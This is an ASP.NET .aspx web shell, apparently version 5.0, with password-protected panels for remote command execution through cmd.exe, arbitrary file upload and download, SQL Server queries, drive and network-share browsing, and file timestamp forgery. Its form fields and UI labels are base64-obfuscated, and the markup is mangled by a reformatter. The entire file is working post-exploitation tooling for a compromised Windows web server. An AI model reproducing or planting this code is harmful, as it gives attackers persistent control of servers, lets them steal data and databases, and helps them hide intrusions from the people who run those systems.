<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>
<%@ Import namespace="System.IO"%>
    <
    html xmlns = "http://www.w3.org/1999/xhtml" >
    <
    head >
    <%

NameValueCollection t=HttpContext.Current.Request.Form;
p=fb(t["p"]);pro=fb(t["pro"]);cmd=fb(t["cmd"]);sav=fb(t["sav"]);vir=t["vir"];nen=fb(t["nen"]);upb=fb(t["upb"]);upd=fb(t["upd"]);del=fb(t["del"]);don=fb(t["don"]);hid=t["hid"];tfil=fb(t["tfil"]);ttar=fb(t["ttar"]);ttim=fb(t["ttim"]);baseFile=t["baseFile"];baseAddr=fb(t["baseAddr"]);baseVir=t["baseVir"];sqc=fb(t["sqc"]);sqq=fb(t["sqq"]);exadd=fb(t["exadd"]);
if(!string.IsNullOrEmpty(p))c(p);
else c();
if(!string.IsNullOrEmpty(cmd))r(pro,cmd);
else if(HttpContext.Current.Request.Files["upl"]!=null)u(HttpContext.Current.Request.Files["upl"],sav,string.IsNullOrEmpty(vir)?false:true,nen);
else if(!string.IsNullOrEmpty(upb))h(upb,upd);
else if(!string.IsNullOrEmpty(del))d(del);
else if(!string.IsNullOrEmpty(don))z(don);
else if(!string.IsNullOrEmpty(tfil))g(hid,tfil,ttar,ttim);
else if(!string.IsNullOrEmpty(baseFile))baseupl(baseFile,baseAddr,string.IsNullOrEmpty(baseVir)?false:true);
else if(!string.IsNullOrEmpty(sqc))sq(sqc,sqq);
else if(!string.IsNullOrEmpty(exadd))exp(exadd);
else if(!string.IsNullOrEmpty(t["gsize"]))gsize(fb(t["gsize"]));

if(HttpContext.Current.Request.Cookies["data"]!=null){string data=fb(HttpContext.Current.Request.Cookies["data"].Value);string[] data2=data.Split(new string[]{"#|#"},StringSplitOptions.None);for(int i=0;i<data2.Length;i++){string[] data3=data2[i].Split(new string[]{"#=#"},StringSplitOptions.None);
switch (data3[0]){
case"pro":pro=a(pro,fb(data3[1]));break;
case"cmd":cmd=a(cmd,fb(data3[1]));break;
case"sav":sav=a(sav,fb(data3[1]));break;
case"vir":vir=a(vir,fb(data3[1]));break;
case"nen":nen=a(nen,fb(data3[1]));break;
case"don":don=a(don,fb(data3[1]));break;
case"tfil":tfil=a(tfil,fb(data3[1]));break;
case"ttar":ttar=a(ttar,fb(data3[1]));break;
case"ttim":ttim=a(ttim,fb(data3[1]));break;
case"sqc":sqc=a(sqc,fb(data3[1]));break;
case"sqq":sqq=a(sqq,fb(data3[1]));break;
case"exadd":exadd=a(exadd,fb(data3[1]));break;
}}}

view();
    %> <
    script runat = "server" >
    string salt = "sdfewq@#$51234234DF@#$!@#$ASDF";
string p, pro, cmd, sav, vir, nen, upb, upd, del, don, hid, tfil, ttar, ttim, baseFile, baseAddr, baseVir, baseName, sqc, sqq, exadd;
bool aut = false;
string pp = "J3ugYdknpax1ZbHB2QILB5NS6dVa0iUD0mhhBPv0Srw=";
string a(string a, string b) {
    return string.IsNullOrEmpty(a) ? b : a;
}
string tb(string a) {
    string ret = "";
    try {
        ret = string.IsNullOrEmpty(a) ? a : Convert.ToBase64String(Encoding.UTF8.GetBytes(a));
    } catch {}
    return ret;
}
string fb(string a) {
    string ret = "";
    try {
        ret = string.IsNullOrEmpty(a) ? a : Encoding.UTF8.GetString(Convert.FromBase64String(a));
    } catch {}
    return ret;
}
void view() {
    string data = string.Format("pro#=#{0}#|#cmd#=#{1}#|#sav#=#{2}#|#vir#=#{3}#|#nen#=#{4}#|#don#=#{5}#|#tfil#=#{6}#|#ttar#=#{7}#|#ttim#=#{8}|#sqc#=#{9}|#sqq#=#{10}|#exadd#=#{11}",
        tb(pro), tb(cmd), tb(sav), tb(vir), tb(nen), tb(don), tb(tfil), tb(ttar), tb(ttim), tb(sqc), tb(sqq), tb(exadd));
    HttpCookie coo = new HttpCookie("data", data);
    coo.Expires = DateTime.Now.AddDays(1);
    HttpContext.Current.Response.SetCookie(coo);
}

void rm() {
    /*System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]);Response.Redirect(Request.RawUrl);*/ }
void c(string p) {
    try {
        HttpCookie coo = new HttpCookie("p", tb(p));
        coo.Expires = DateTime.Now.AddDays(1);
        HttpContext.Current.Response.SetCookie(coo);
        c();
    } catch (Exception e) {
        l(e.Message);
    }
}
bool c() {
    try {
        if (HttpContext.Current.Request.Cookies["p"] != null) {
            aut = Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(fb(HttpContext.Current.Request.Cookies["p"].Value) + salt))) == pp;
            if (!aut) rm();
            return aut;
        }
    } catch (Exception e) {
        l(e.Message);
    }
    rm();
    return false;
}
void u(HttpPostedFile upl, string sav, bool vir, string nen) {
    try {
        if (c()) {
            if (upl != null && upl.ContentLength > 0) {
                string fn = string.IsNullOrEmpty(nen) ? System.IO.Path.GetFileName(upl.FileName) : nen;
                string path = vir ? Server.MapPath(sav) : sav;
                string SaveLocation = System.IO.Path.HasExtension(path) ? path : path.TrimEnd('\\') + "\\" + fn;
                upl.SaveAs(SaveLocation);
                l("File uploaded successfuly : " + SaveLocation);
            }
        }
    } catch (Exception ex) {
        l(ex.Message);
    }
}
void baseupl(string baseFile, string baseAddr, bool baseVir) {
    try {
        if (c()) {
            if (baseFile != null && baseFile.Length > 0 && !string.IsNullOrEmpty(baseAddr)) {
                string SaveLocation = baseVir ? Server.MapPath(baseAddr) : baseAddr;
                System.IO.File.WriteAllBytes(SaveLocation, Convert.FromBase64String(baseFile));
                l("File uploaded successfuly : " + SaveLocation);
            }
        }
    } catch (Exception ex) {
        l(ex.Message);
    }
}
void r(string pro, string cmd) {
    try {
        if (c()) {
            string o = exec(cmd, pro);
            l(HttpUtility.HtmlEncode(o));
        }
    } catch (Exception ex) {
        l(ex.Message);
    }
}
void z(string don) {
    try {
        if (c() && !string.IsNullOrEmpty(don)) {
            byte[] f = System.IO.File.ReadAllBytes(don);
            System.Web.HttpContext t = System.Web.HttpContext.Current;
            t.Response.Clear();
            t.Response.ClearHeaders();
            t.Response.ClearContent();
            t.Response.AppendHeader("content-length", f.Length.ToString());
            t.Response.ContentType = "application/octet-stream";
            t.Response.AppendHeader("content-disposition", "attachment; filename=" + don.Substring(don.LastIndexOf('\\') + 1));
            t.Response.BinaryWrite(f);
            t.Response.End();
        }
    } catch (Exception ex) {
        l(ex.Message);
    }
}
string ti(string tt) {
    return "Creation Time :\t\t" + System.IO.File.GetCreationTime(tt).ToString("yyyy-MM-dd HH:mm:ss") + "<br>Last Access Time :\t" + System.IO.File.GetLastAccessTime(tt).ToString("yyyy-MM-dd HH:mm:ss") + "<br>Last Write Time :\t" + System.IO.File.GetLastWriteTime(tt).ToString("yyyy-MM-dd HH:mm:ss");
}
void g(string hid, string tfil, string ttar, string ttim) {
    try {
        if (c() && !string.IsNullOrEmpty(tfil)) {
            l(string.Empty);
            if (hid == "1") ti(tfil);
            else if (hid == "2") {
                if (!string.IsNullOrEmpty(ttar)) {
                    System.IO.File.SetCreationTime(tfil, System.IO.File.GetCreationTime(ttar));
                    System.IO.File.SetLastAccessTime(tfil, System.IO.File.GetLastAccessTime(ttar));
                    System.IO.File.SetLastWriteTime(tfil, System.IO.File.GetLastWriteTime(ttar));
                    l("Time successfuly changed :<br>" + tfil + "<br>" + ti(tfil));
                }
            } else if (hid == "3") {
                if (!string.IsNullOrEmpty(ttim)) {
                    DateTime te = DateTime.Parse(ttim);
                    System.IO.File.SetCreationTime(tfil, te);
                    System.IO.File.SetLastAccessTime(tfil, te);
                    System.IO.File.SetLastWriteTime(tfil, te);
                    l("Time successfuly changed :<br>" + tfil + "<br>" + ti(tfil));
                }
            }
        }
    } catch (Exception ex) {
        l(ex.Message);
    }
}
void h(string upb, string upd) {
    try {
        if (c() && !string.IsNullOrEmpty(upb) && !string.IsNullOrEmpty(upd)) {
            System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath() + upd, Convert.FromBase64String(upb));
            l(upd + " successfuly uploaded");
        }
    } catch (Exception ex) {
        l(ex.Message);
    }
}
void d(string del) {
    try {
        if (c() && !string.IsNullOrEmpty(del)) {
            System.IO.File.Delete(System.IO.Path.GetTempPath() + del);
            l(del + " successfuly deleled");
        }
    } catch (Exception ex) {
        l(ex.Message);
    }
}
void sq(string sqc, string sqq) {
    try {
        if (c()) {
            if (!string.IsNullOrEmpty(sqc)) {
                using(System.Data.SqlClient.SqlConnection con = new System.Data.SqlClient.SqlConnection(sqc)) {
                    if (string.IsNullOrEmpty(sqq)) {
                        try {
                            con.Open();
                            l("Sql Server Connection Successfuly Established");
                        } catch (Exception ex) {
                            l("Sql Server Connection Failed :" + Environment.NewLine + ex.ToString());
                        }
                    } else {
                        try {
                            con.Open();
                            System.Data.SqlClient.SqlCommand com = new System.Data.SqlClient.SqlCommand(sqq, con);
                            System.Data.SqlClient.SqlDataAdapter ad = new System.Data.SqlClient.SqlDataAdapter(com);
                            System.Data.DataTable dt = new System.Data.DataTable();
                            ad.Fill(dt);
                            DataGrid grid = new DataGrid();
                            System.Web.UI.WebControls.DataList list = new System.Web.UI.WebControls.DataList();
                            grid.DataSource = dt;
                            grid.DataBind();
                            log.Controls.Add(grid);
                        } catch (Exception ex) {
                            l("Error : <br>" + ex.ToString());
                        }
                    }
                    con.Close();
                }
            }
        }
    } catch (Exception ex) {
        l(ex.Message);
    }
}
string x(string f) {
    return Encoding.UTF8.GetString(Convert.FromBase64String(f));
}
void l(string ll) {
    log.InnerHtml = tb(ll);
}

string exec(string cmd, string pro = "") {
    System.Diagnostics.Process n = new System.Diagnostics.Process();
    n.StartInfo.FileName = (string.IsNullOrEmpty(pro) ? "cmd.exe" : pro);
    n.StartInfo.UseShellExecute = false;
    n.StartInfo.RedirectStandardInput = true;
    n.StartInfo.RedirectStandardOutput = true;
    n.StartInfo.RedirectStandardError = true;
    n.StartInfo.CreateNoWindow = true;
    string o = null;
    n.Start();
    n.StandardInput.WriteLine(cmd);
    n.StandardInput.WriteLine("exit");
    o = n.StandardOutput.ReadToEnd();
    n.WaitForExit();
    n.Close();
    return o;
}

void gsize(string addr) {
    string ret = "error : -";
    try {
        long size = GetDirSize(new DirectoryInfo(addr));
        ret = sizeFix(size);
    } catch (Exception ex) {
        ret = "Error : " + ex.Message;
    }

    Response.Clear();
    Response.Write(tb(ret));
    Response.End();
}

void exp(string exadd) {
    string ret = "error : -";
    try {
        if (exadd.ToLower() == "root") {
            ret = "{\"dir\":[\"\\\\\\\\localhost\""; // in javascript json parser two \ = one \
            string netUse = exec("net use");
            string[] lines = netUse.Split(new string[] {
                Environment.NewLine
            }, StringSplitOptions.RemoveEmptyEntries);
            foreach(string item in lines) {
                if (item.ToLower().StartsWith("ok")) {
                    int index = item.IndexOf("\\\\");
                    ret += ",\"\\\\" + item.Substring(index, item.IndexOf('\\', index + 2) - index) + "\"";
                }
            }
            ret += "]}";
        } else {
            if (exadd.Trim('\\').Split('\\').Count() == 1) // \\localhost
            {
                string tmp = exadd.ToLower().TrimEnd('\\');
                if (tmp == "\\\\localhost") {
                    ret = "{\"dir\":[";
                    bool isStart = false;
                    foreach(DriveInfo item in DriveInfo.GetDrives()) {
                        if (item.IsReady) {
                            if (isStart)
                                ret += ",";
                            ret += "\"" + item.Name.TrimEnd('\\').TrimEnd(':') + "$\"";
                            isStart = true;
                        }
                    }
                    ret += "]}";
                } else {

                }
            } else // \\localhost\c$\
            {
                FileAttributes attr = File.GetAttributes(exadd);
                if ((attr & FileAttributes.Directory) == FileAttributes.Directory) {
                    DirectoryInfo dirInfo = new DirectoryInfo(exadd);
                    ret = "{" + string.Format("{0},{1}", createJsonDirectory(dirInfo.GetDirectories()), createJsonFile(dirInfo.GetFiles())) + "}";
                }
            }
        }
    } catch (Exception ex) {
        ret = "Error : " + ex.Message;
    }
    Response.Clear();
    Response.Write(tb(ret));
    Response.End();
}
long GetDirSize(DirectoryInfo d) {
    long size = 0;

    FileInfo[] fis = d.GetFiles();
    foreach(FileInfo fi in fis) {
        size += fi.Length;
    }

    DirectoryInfo[] dis = d.GetDirectories();
    foreach(DirectoryInfo di in dis) {
        size += GetDirSize(di);
    }

    return size;
}
string createJsonDirectory(DirectoryInfo[] dir) {
    string json = "\"dir\":[";
    for (int i = 0; i < dir.Length; i++) {
        if (i > 0)
            json += ",";
        json += "\"" + dir[i].Name + "\"";
    }
    json += "]";
    return json;
}
string createJsonFile(FileInfo[] file) {
    string json = "\"file\":[";
    for (int i = 0; i < file.Length; i++) {
        if (i > 0)
            json += ",";
        json += "[\"" + file[i].Name + "\",\"" + sizeFix(file[i].Length) + "\"]";
    }
    json += "]";
    return json;
}
string sizeFix(long size) {
        double s = size;
        if (s < 1024) return s + " B";
        s = s / 1024;
        if (s < 1024) return Math.Round(s, 2) + " KB";
        s = s / 1024;
        if (s < 1024) return Math.Round(s, 2) + " MB";
        s = s / 1024;
        return Math.Round(s, 2) + " GB";
    } <
    /script>

    <
    style > body, html {
        margin: 0;padding: 5 px;direction: ltr;background: #aaa;color: #000 !important;}form{margin:0;}*{font:14px "Lucida Console";}t{width:180px;display:inline-block;text-align:right;padding-right:5px;}g{margin-left:30px;}input[type= "text"], input[type = "file"], textarea {
        width: 60 % ;height: 25 px;background: #cbcbcb;color: #000;border:1px solid # 999;margin - bottom: 3 px;
    }
input[type = "text"] {
    padding: 2 px;
}
input[type = "button"], input[type = "submit"] {
    height: 23 px;
}
input[type = "checkbox"] {
    width: 23 px;height: 24 px;position: absolute;margin: 0;
}
hr {
    margin: 0;border: 0;border - top: 1 px solid# DDD;
}.h {
    width: 100 px;text - align: center;background: rgb(255, 36, 0);color: #fff;vertical - align: middle;
}
table {
    width: 100 % ;margin: 0;border - collapse: collapse;
}.b {
    padding: 10 px 0 px 9 px;
} < /style> <
script >
    function use() {
        var n = document;
        var d = n.getElementById("d").innerHTML;
        d = d.substring(0, d.lastIndexOf('\\') + 1);
        n.getElementsByName("cmd")[0].value += d;
        n.getElementsByName("sav")[0].value += d;
        n.getElementsByName("don")[0].value += d;
    }

function subm() {
    var mmm = document.getElementsByClassName('mmm');
    for (var i = 0; i < mmm.length; i++) {
        mmm[i].value = b64EncodeUnicode(mmm[i].value);
    }
}

function reset() {
    document.cookie = "data=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/";
    location.href = location.pathname;
} <
/script> <
style >
    div.tbbt {
        overflow: hidden;border: 1 px solid# ccc;
    }
div.tbbt button {
    background - color: inherit;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14 px 16 px;
    transition: 0.3 s;
    font - size: 17 px;
}
div.tbbt button: hover {
    background - color: #ddd
}
div.tbbt button.active {
        background - color: #ccc
    }
    .tb {
        display: none;border: 1 px solid# ccc;border - top: none
    }
    .loader {
        border: 3 px solid# f3f3f3;
        border - radius: 50 % ;
        border - top: 3 px solid #3498db;
        width:16px;
        height:16px;
        -webkit-animation: spin 2s linear infinite;
        animation:spin 2s linear infinite;
        position:absolute;
    }
    @-webkit-keyframes spin {
        0%{ -webkit-transform:rotate(0deg);}
        100%{-webkit-transform:rotate(360deg);}
    }
    @keyframes spin {
        0%{ transform:rotate(0deg);}
        100%{transform:rotate(360deg);}
    }
    # objFrame {
                padding: 0 5 px 5 px 5 px
            }
            .objD {
                /*background-color: #d8d808;*/
                background - color: #23a4ff;
        padding: 5px;
        display: table;
        cursor: pointer;
        margin-left: 100px;
    }
    .objF {
        margin-top: 5px;
        min-height: 24px;
    }
    .objS {
        position: absolute;
        width: 90px;
        text-align: right;
        cursor: default;
        background-color: # c3c3c3;
                padding: 5 px;
                min - height: 14 px;
            }
            .objN {
                display: table;
                padding: 5 px;
                background - color: #23d7ff;
        margin-left: 100px;
        cursor: pointer;
    }
    .objB {
        margin-left:3px;
        padding:5px;
    }
    .objL{display:inline-block;margin-left:3px;}
    # objLocation {
                        padding: 0 5 px 0 5 px;
                    }
                    .objLabel {
                        display: inline - block;
                        padding: 5 px;
                        width: 87 px;
                        background - color: #c3c3c3;
                        margin - top: 5 px;
                    }
                    .objError {
                        background - color: #ff2e2e;
                        color: white;
                    } <
                    /style> <
                    script >
                    var sizeArray = new Array();

                function openTab(ev, nm) {
                    var i, tb, tblnk;
                    tb = document.getElementsByClassName("tb");
                    for (i = 0; i < tb.length; i++) {
                        tb[i].style.display = "none";
                    }
                    tblnk = document.getElementsByClassName("tblnk");
                    for (i = 0; i < tblnk.length; i++) {
                        tblnk[i].className = "tblnk";
                    }
                    document.getElementById(nm).style.display = "block";
                    ev.currentTarget.className += " active";
                }

                function readCookie(name) {
                    var nameEQ = name + "=";
                    var ca = document.cookie.split(';');
                    for (var i = 0; i < ca.length; i++) {
                        var c = ca[i];
                        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
                        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
                    }
                    return null;
                }

                function sendAddress() {
                    document.getElementById("loader").style.display = "inline-block";
                    var address = document.getElementsByName("exadd")[0].value;
                    var info = {
                        data: "exadd=" + b64EncodeUnicode(address),
                        onSuccess: function(resText) {

                            document.getElementById("loader").style.display = "none";
                            var data = b64DecodeUnicode(resText)
                            makeLocation();
                            var Frame = document.getElementById("objFrame");
                            Frame.innerHTML = "";
                            if (data.startsWith("Error")) {
                                addError(Frame, data);
                            } else {
                                var info = JSON.parse(data);
                                console.log(data);
                                console.log(info);
                                if (info.dir) {
                                    var f = document.createElement("div");
                                    f.className = "objF";

                                    var s = document.createElement("div");
                                    s.className = "objS";
                                    s.innerText = "Get All";
                                    s.style.cursor = "pointer";
                                    s.onclick = function() {
                                        getAllSize();
                                    };

                                    f.appendChild(s);
                                    Frame.appendChild(f);

                                    for (var i = 0; i < info.dir.length; i++)
                                        addFolder(Frame, info.dir[i]);
                                }
                                if (info.file)
                                    for (var i = 0; i < info.file.length; i++)
                                        addFile(Frame, info.file[i][0], info.file[i][1])
                            }
                        }
                    };
                    sendData(info);
                }

                function makeLocation() {
                    var loc = document.getElementById("objLocation");
                    loc.innerHTML = "";

                    var lbl = document.createElement("div");
                    lbl.className = "objLabel";
                    lbl.innerText = "Location :";
                    loc.appendChild(lbl);
                    var curAdd = document.getElementsByName("exadd")[0].value.split("\\");
                    var sendLoc = "";
                    if (document.getElementsByName("exadd")[0].value.startsWith("\\\\"))
                        sendLoc += "\\\\";
                    for (var i = 0; i < curAdd.length; i++) {
                        if (curAdd[i] == "")
                            continue;
                        sendLoc += curAdd[i] + "\\";
                        var o = document.createElement("div");
                        if (i == curAdd.length - 1)
                            o.style.display = "inline-block";
                        else {
                            o.setAttribute("loc", sendLoc);
                            o.onclick = function() {
                                document.getElementsByName("exadd")[0].value = this.getAttribute("loc");
                                sendAddress();
                            };
                            o.className = "objD objL";
                        }
                        o.innerText = curAdd[i] + "\\";

                        loc.appendChild(o);
                    }
                    if (document.getElementsByName("exadd")[0].value.startsWith("\\\\")) {
                        loc.childNodes[1].innerText = "\\\\" + loc.childNodes[1].innerText;
                    }
                    loc.lastChild.style.display = "inline-block";
                    loc.lastChild.onclick = function() {};
                    loc.lastChild.className = "objB";
                }

                function addError(parent, error) {
                    var d = document.createElement("div");
                    d.className = "objD objError";
                    d.innerText = error;
                    parent.appendChild(d);
                }

                function addFolder(parent, name) {
                    var f = document.createElement("div");
                    f.className = "objF";

                    var d = document.createElement("div");
                    d.className = "objD";
                    d.innerText = name;
                    d.onclick = function() {
                        setAddress(this.innerText);
                    };

                    var s = document.createElement("div");
                    s.className = "objS dir";
                    if (sizeArray[getCurrentAddress() + "\\" + name])
                        setSize(s, sizeArray[getCurrentAddress() + "\\" + name]);
                    else
                        s.innerText = "...";

                    s.style.cursor = "pointer";
                    s.onclick = function() {
                        getSize(s, d.innerText);
                    };

                    f.appendChild(s);
                    f.appendChild(d);
                    parent.appendChild(f);
                }

                function addFile(parent, name, size) {
                    var f = document.createElement("div");
                    f.className = "objF";
                    var s = document.createElement("div");
                    s.className = "objS";
                    setSize(s, size)
                    var n = document.createElement("div");
                    n.className = "objN";
                    n.innerText = name;
                    n.onclick = function() {
                        expDownload(this.innerText);
                    };

                    f.appendChild(s);
                    f.appendChild(n);

                    parent.appendChild(f);
                }

                function getCurrentAddress() {
                    var address = document.getElementsByName("exadd")[0];
                    if (address.value.endsWith("\\"))
                        address.value = address.value.substring(0, address.value.length - 1);
                    return address.value;
                }

                function expDownload(name) {
                    var path = getCurrentAddress() + "\\" + name;

                    document.getElementById("donInput").value = path;
                    document.getElementById("donSubmit").click();
                }

                function setAddress(name) {
                    var address = document.getElementsByName("exadd")[0];
                    if (address.value.endsWith("\\"))
                        address.value = address.value.substring(0, address.value.length - 1);
                    var path = name;
                    if (path == 'root' || path.startsWith('\\\\'))
                        address.value = path;
                    else
                        address.value += "\\" + name;
                    sendAddress();
                }

                function getNextSize(alls) {
                    if (alls.length > 0) {
                        var s = alls[0];
                        alls.shift();
                        console.log(alls);
                        console.log(s);
                        getSize(s, s.nextSibling.innerText, function() {
                            getNextSize(alls)
                        });
                    }
                }

                function getAllSize() {
                    var allSizes = [].slice.call(document.getElementsByClassName("objS dir"));
                    getNextSize(allSizes);
                }

                function getSize(objSize, name, callBack) {
                    objSize.innerText = "";
                    var ldr = document.createElement("span");
                    ldr.className = "loader";
                    ldr.style.width = "12px";
                    ldr.style.height = "12px";
                    ldr.style.top = "3px";
                    ldr.style.left = "80px";
                    objSize.appendChild(ldr);
                    var address = getCurrentAddress() + "\\" + name;
                    var info = {
                        data: "gsize=" + b64EncodeUnicode(address),
                        onSuccess: function(resText) {

                            ldr.remove();
                            var data = b64DecodeUnicode(resText)
                            setSize(objSize, data)
                            if (!data.startsWith("Error"))
                                sizeArray[address] = data;

                            if (callBack)
                                callBack();
                        }
                    };
                    sendData(info);
                }

                function checkEnter(ev) {
                    if (ev.which == 13 || ev.keyCode == 13) {
                        sendAddress();
                        return false;
                    }
                    return true;
                }

                function setSize(obj, size) {
                    obj.innerText = size;
                    if (size.endsWith("KB"))
                        obj.style.backgroundColor = "#ece979";
                    else if (size.endsWith("MB"))
                        obj.style.backgroundColor = "#ffd36f";
                    else if (size.endsWith("GB"))
                        obj.style.backgroundColor = "#ff6f6f";
                }

                function sendData(info) {
                    var data = info.data;
                    var xh = new XMLHttpRequest();
                    xh.onreadystatechange = function() {
                        if (this.readyState == 4 && this.status == 200) {
                            info.onSuccess(this.responseText);
                        }
                    };
                    xh.open("POST", location.pathname, true);
                    xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    xh.send("p=" + readCookie("p") + "&" + data);
                }

                function b64DecodeUnicode(str) {
                    return decodeURIComponent(Array.prototype.map.call(atob(str), function(c) {
                        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
                    }).join(''))
                }

                function b64EncodeUnicode(str) {
                    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
                        return String.fromCharCode(parseInt(p1, 16))
                    }))
                } <
                /script> <
                /head> <
                body >
                <
                div class = "tbbt" >
                <
                button class = "tblnk active"
                onclick = "openTab(event, 'tbMain')" > Main < /button> <
                button class = "tblnk"
                onclick = "openTab(event, 'tbDir')" > Explorer < /button> <
                /div> <
                div id = "tbMain"
                class = "tb"
                style = "display:block" >
                <
                table >
                <
                tr >
                <
                td class = "h" > <%=x("QWRkcmVzcw==")%> < /td> <
                td class = "b" >
                <
                t > <%=x("Q3VycmVudA==")%>: < /t> <
                    y id = "d" > <%= Server.MapPath(string.Empty) + "\\"%> < /y> <
                    input type = "button"
                value = "<%=x("VXNl")%>"
                onclick = "use()" / >
                <
                input type = "button"
                value = "<%=x("UmVzZXQgRm9ybQ==")%>"
                onclick = "reset()" / >
                <
                div style = "float:right" > v5 .0 < /div> <
                /td> <
                /tr> <
                /table> <
                hr >
                <
                form method = "post" >
                <
                table >
                <
                tr >
                <
                td class = "h" > <%=x("TG9naW4=")%> < /td> <
                td class = "b" >
                <
                t > <%=x("RG8gaXQ=")%>: < /t> <
                    input name = "p"
                class = "mmm"
                type = "text"
                style = 'background-color: <%= aut ? "Green" : "Red" %>' / >
                <
                input type = "submit"
                value = "<%= x("RG8gaXQ=") %>"
                onclick = "subm();" / >
                <
                /td> <
                /tr> <
                /table> <
                /form> <
                hr >
                <
                form method = "post" >
                <
                table >
                <
                tr >
                <
                td class = "h" > <%=x("Q29tbWFuZA==")%> < /td> <
                td class = "b" >
                <
                t > <%=x("UHJvY2Vzcw==")%>: < /t> <
                    input name = "pro"
                class = "mmm"
                type = "text"
                value = '<%= string.IsNullOrEmpty(pro) ? x("Y21kLmV4ZQ==") : pro %>' / > < br >
                <
                t > <%=x("Q29tbWFuZA==")%>: < /t> <
                    input name = "cmd"
                class = "mmm"
                type = "text"
                value = '<%= cmd %>' / >
                <
                input type = "submit"
                value = "<%= x("RXhlY3V0ZQ==") %>"
                onclick = "subm();" / >
                <
                /td> <
                /tr> <
                /table> <
                /form> <
                hr >
                <
                form method = "post"
                enctype = "multipart/form-data" >
                <
                table >
                <
                tr >
                <
                td class = "h" > <%=x("VXBsb2Fk")%> < /td> <
                td class = "b" >
                <
                t > <%=x("RmlsZSBuYW1l")%>: < /t> <
                    input name = "upl"
                type = "file" / > < br >
                <
                t > <%=x("U2F2ZSBhcw==")%>: < /t> <
                    input name = "sav"
                class = "mmm"
                type = "text"
                value = '<%= sav %>' / >
                <
                input name = "vir"
                type = "checkbox" / > < g > <%=x("SXMgdmlydHVhbCBwYXRo")%> < /g><br> <
                t > <%=x("TmV3IEZpbGUgbmFtZQ==")%>: < /t> <
                    input name = "nen"
                class = "mmm"
                type = "text"
                value = '<%= nen %>' / >
                <
                input type = "submit"
                value = "<%= x("VXBsb2Fk") %>"
                onclick = "subm();" / >
                <
                /td> <
                /tr> <
                /table> <
                /form> <
                hr >
                <
                form method = "post" >
                <
                table >
                <
                tr >
                <
                td class = "h" > <%=x("RG93bmxvYWQ=")%> < /td> <
                td class = "b" >
                <
                t > <%=x("RmlsZSBuYW1l")%>: < /t> <
                    input id = "donInput"
                name = "don"
                type = "text" / >
                <
                input id = "donSubmit"
                type = "submit"
                value = "<%= x("RG93bmxvYWQ=") %>"
                onclick = "document.getElementsByName('don')[0].value = b64EncodeUnicode(document.getElementsByName('don')[0].value);" / >
                <
                /td> <
                /tr> <
                /table> <
                /form> <
                hr / >
                <
                form method = "post" >
                <
                table >
                <
                tr >
                <
                td class = "h" > <%=x("VXBsb2FkIEJhc2U2NA==")%> < /td> <
                td class = "b" >
                <
                t > <%=x("QmFzZTY0IEZpbGU=")%>: < /t> <
                    textarea name = "baseFile" > < /textarea> <
                    input name = "baseVir"
                type = "checkbox" / > < g > <%=x("SXMgdmlydHVhbCBwYXRo")%> < /g><br> <
                t > <%=x("RmlsZSBQYXRoIGFuZCBOYW1l ")%>: < /t> <
                    input name = "baseAddr"
                class = "mmm"
                type = "text"
                value = '<%= baseAddr %>' / >
                <
                input type = "submit"
                value = "<%= x("VXBsb2Fk") %>"
                onclick = "subm();" / >
                <
                /td> <
                /tr> <
                /table> <
                /form> <
                hr / >
                <
                form method = "post" >
                <
                table >
                <
                tr >
                <
                td class = "h" > <%=x("U3FsIFNlcnZlcg==")%> < /td> <
                td class = "b" >
                <
                input style = "margin:0 0 3px 192px"
                type = "button"
                value = "<%=x("U3RhbmRhcmQgQ29ubmVjdGlvbiBTYW1wbGU=")%>"
                onclick = "document.getElementsByName('sqc')[0].value = '<%=x("U2VydmVyPS47RGF0YWJhc2U9ZGI7VXNlciBJZD11c2VyO1Bhc3N3b3JkPXBhc3M=")%>    '" / >
                <
                input style = "margin:0 0 3px 0"
                type = "button"
                value = "<%=x("VHJ1c3RlZCBDb25uZWN0aW4gU2FtcGxl")%>"
                onclick = "document.getElementsByName('sqc')[0].value = '<%=x("U2VydmVyPS47RGF0YWJhc2U9ZGI7VHJ1c3RlZF9Db25uZWN0aW9uPVRydWU=")%>    '" / > < br / >
                <
                t > <%=x("Q29ubmVjdGlvbiBTdHJpbmc=")%>: < /t> <
                    input name = "sqc"
                class = "mmm"
                type = "text"
                value = '<%= sqc %>' / > < br / >
                <
                t > <%=x("UXVlcnk=")%>: < /t> <
                    textarea name = "sqq"
                class = "mmm" > <%= sqq %> < /textarea> <
                input type = "submit"
                value = "<%= x("UnVu") %>"
                onclick = "subm();" / >
                <
                /td> <
                /tr> <
                /table> <
                /form> <
                hr / >
                <
                form method = "post" >
                <
                table >
                <
                tr >
                <
                td class = "h" > <%=x("Q2hhbmdlIENyZWF0aW9uIFRpbWU=")%> < /td> <
                td class = "b" >
                <
                input name = "hid"
                type = "hidden" / >
                <
                t > <%=x("RmlsZSBuYW1l")%>: < /t> <
                    input name = "tfil"
                class = "mmm"
                type = "text"
                value = '<%= tfil %>' / >
                <
                input type = "submit"
                value = "<%= x("R2V0") %>"
                onclick = "subm(); document.getElementsByName('hid')[0].value = '1'" / > < br >
                <
                t > <%=x("RnJvbSBUaGlzIEZpbGU=")%>: < /t> <
                    input name = "ttar"
                class = "mmm"
                type = "text"
                value = '<%= ttar %>' / >
                <
                input type = "submit"
                value = "<%= x("U2V0") %>"
                onclick = "subm(); document.getElementsByName('hid')[0].value = '2'" / > < br >
                <
                t > <%=x("TmV3IFRpbWU=")%>: < /t> <
                    input name = "ttim"
                class = "mmm"
                type = "text"
                value = '<%= ttim %>' / >
                <
                input type = "submit"
                value = "<%= x("U2V0") %>"
                onclick = "subm(); document.getElementsByName('hid')[0].value = '3'" / >
                <
                /td> <
                /tr> <
                /table> <
                /form> <
                hr / >
                <
                br / >
                <
                pre id = "log"
                runat = "server" > < /pre> <
                script >
                var ll = document.getElementById('log');
                if (ll.innerHTML) ll.innerHTML = atob(log.innerHTML); < /script> <
                /div> <
                div id = "tbDir"
                class = "tb" >
